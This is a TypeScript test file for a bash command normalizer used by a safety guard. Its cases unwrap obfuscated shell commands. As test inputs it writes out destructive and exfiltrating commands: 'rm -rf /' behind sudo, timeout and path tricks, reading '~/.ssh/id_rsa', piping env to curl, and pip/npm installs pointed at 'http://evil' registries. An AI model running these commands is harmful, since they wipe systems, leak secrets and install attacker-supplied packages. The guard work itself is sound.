/**
 * Tests for `leafCommandsNormalized` — the operation-normalized leaf extractor.
 *
 * Each case encodes a semantics-preserving obfuscation that a Lit-only matcher
 * (built on `leafCommands`) is defeated by, and asserts the normalized form
 * exposes the underlying OPERATION (basename head, unwrapped args, canonical
 * flags, $HOME→~). This is the primitive the hardened guard
 * (examples/harness/safe-bash-guard-v2.mjs) matches over.
 */
import { test } from "vitest";
import assert from "node:assert/strict";

import { leafCommandsNormalized } from "./bash-effects.js";

const one = (cmd: string) => {
  const [leaf] = leafCommandsNormalized(cmd);
  assert.ok(leaf, `expected a leaf for: ${cmd}`);
  return leaf;
};

// --- quoted flags survive (single AND double quotes) ------------------------

test("single-quoted flag → flag is recovered", () => {
  const l = one("git push '--force' origin main");
  assert.equal(l.head, "git");
  assert.ok(l.hasFlag("force"));
  assert.ok(l.hasFlag("f"));
});

test("double-quoted flag → flag is recovered", () => {
  const l = one('git reset "--hard" HEAD~5');
  assert.ok(l.hasFlag("hard"));
});

// --- absolute-path interpreter is normalized to basename --------------------

test("/bin/rm → head rm", () => {
  assert.equal(one("/bin/rm -rf /").head, "rm");
});

test("/usr/bin/git → head git", () => {
  assert.equal(one("/usr/bin/git reset --hard HEAD~5").head, "git");
});

// --- backslash-escaped head is unescaped ------------------------------------

test("\\rm → head rm", () => {
  assert.equal(one("\\rm -rf /").head, "rm");
});

// --- short/long flag aliases are unified ------------------------------------

test("short cluster -rf → r,f AND recursive,force", () => {
  const l = one("rm -rf /");
  for (const f of ["r", "f", "recursive", "force"]) assert.ok(l.hasFlag(f), f);
});

test("git commit -n ≡ --no-verify", () => {
  assert.ok(one("git commit -n -m x").hasFlag("no-verify"));
});

test("pip -i ≡ --index-url", () => {
  assert.ok(one("pip install -i http://x/simple p").hasFlag("index-url"));
});

test("--index-url=value → flag name split on =", () => {
  assert.ok(
    one("pip install --index-url=http://x/simple p").hasFlag("index-url"),
  );
});

// --- $HOME / ${HOME} canonicalize to ~ --------------------------------------

test('"$HOME/.ssh/id_rsa" → ~/.ssh/id_rsa', () => {
  assert.ok(one('cat "$HOME/.ssh/id_rsa"').args.includes("~/.ssh/id_rsa"));
});

test("${HOME} canonicalizes too", () => {
  assert.ok(one('cat "${HOME}/.ssh/id_rsa"').args.includes("~/.ssh/id_rsa"));
});

// --- structural coverage: leaves inside pipelines/&& are all found ----------

test("both sides of a pipe are extracted, basename-normalized", () => {
  const leaves = leafCommandsNormalized("env | /usr/bin/curl http://x");
  assert.deepEqual(
    leaves.map((l) => l.head),
    ["env", "curl"],
  );
});

test("leaf hidden in cd x && git push -f is found", () => {
  const leaves = leafCommandsNormalized("cd repo && git push -f origin main");
  const push = leaves.find((l) => l.head === "git");
  assert.ok(push && push.hasFlag("force"));
});

// --- command-wrapper prefixes are resolved to the real operation ------------

test("env VAR= git push --force → git push --force leaf", () => {
  const l = one("env GIT_SSH= git push --force origin main");
  assert.equal(l.head, "git");
  assert.ok(l.args.includes("push"));
  assert.ok(l.hasFlag("force"));
});

test("command rm -rf / → rm leaf with force flag", () => {
  const l = one("command rm -rf /");
  assert.equal(l.head, "rm");
  assert.ok(l.hasFlag("force"));
  assert.ok(l.args.includes("/"));
});

test("sudo rm -rf / → rm leaf", () => {
  const l = one("sudo rm -rf /");
  assert.equal(l.head, "rm");
  assert.ok(l.hasFlag("force"));
});

test("timeout 5 rm -rf / → duration skipped, rm leaf", () => {
  const l = one("timeout 5 rm -rf /");
  assert.equal(l.head, "rm");
  assert.ok(l.args.includes("/"));
  assert.ok(!l.args.includes("5")); // DURATION positional consumed by timeout
});

test("nice -n 10 rm -rf / → option value skipped, rm leaf", () => {
  const l = one("nice -n 10 rm -rf /");
  assert.equal(l.head, "rm");
  assert.ok(!l.args.includes("10"));
});

test("nested wrappers sudo timeout 5 rm unwrap fully", () => {
  const l = one("sudo timeout 5 rm -rf /");
  assert.equal(l.head, "rm");
});

test("command with absolute-path inner head is basename-normalized", () => {
  assert.equal(one("command /bin/rm -rf /").head, "rm");
});

test("bare env (no inner command) is preserved as an env leaf", () => {
  const l = one("env");
  assert.equal(l.head, "env");
});

test("env -i with no inner command stays env", () => {
  assert.equal(one("env -i").head, "env");
});

// --- leading env-assignments are exposed on the leaf ------------------------

test("PIP_INDEX_URL=… pip install → assignment exposed, head is pip", () => {
  const l = one("PIP_INDEX_URL=http://evil/simple pip install pkg");
  assert.equal(l.head, "pip");
  assert.ok(l.hasAssign("PIP_INDEX_URL"));
  assert.equal(l.assigns.get("PIP_INDEX_URL"), "http://evil/simple");
});

test("NPM_CONFIG_REGISTRY=… npm install → assignment exposed", () => {
  const l = one("NPM_CONFIG_REGISTRY=http://evil npm install pkg");
  assert.equal(l.head, "npm");
  assert.ok(l.hasAssign("NPM_CONFIG_REGISTRY"));
});

test("env wrapper NAME=value is folded into the leaf's assigns", () => {
  const l = one("env PIP_INDEX_URL=http://evil pip install pkg");
  assert.equal(l.head, "pip");
  assert.ok(l.hasAssign("PIP_INDEX_URL"));
});

test("a leaf with no assignments has an empty assigns map", () => {
  const l = one("rm -rf /");
  assert.equal(l.assigns.size, 0);
  assert.ok(!l.hasAssign("PIP_INDEX_URL"));
});

// --- dynamic head / parse failure are handled ------------------------------

test("dynamic head ($VAR) is skipped, not crashed", () => {
  const leaves = leafCommandsNormalized("$TOOL --force");
  assert.ok(leaves.every((l) => l.head !== "")); // no bogus empty-head leaf
});

test("non-HOME parameter makes an arg dynamic (dropped, not misparsed)", () => {
  // The $PKG arg is dropped; the literal 'install' still surfaces.
  const l = one("pip install $PKG");
  assert.ok(l.args.includes("install"));
  assert.ok(!l.args.some((a) => a.includes("$PKG")));
});
